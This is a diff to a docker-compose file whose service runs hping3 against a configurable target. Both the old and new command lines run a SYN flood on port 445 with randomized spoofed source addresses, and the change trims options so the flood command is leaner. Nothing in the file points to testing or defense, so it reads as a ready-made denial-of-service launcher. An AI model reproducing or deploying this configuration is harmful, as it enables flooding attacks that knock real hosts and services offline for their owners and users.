@@ -5,4 +5,4 @@ services:
         build: my_ping
         environment:
             TARGET: ${TARGET}
-        command: hping3 -V -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source $TARGET
+        command: hping3 -S -p 445 -s 445 --flood --rand-source $TARGET
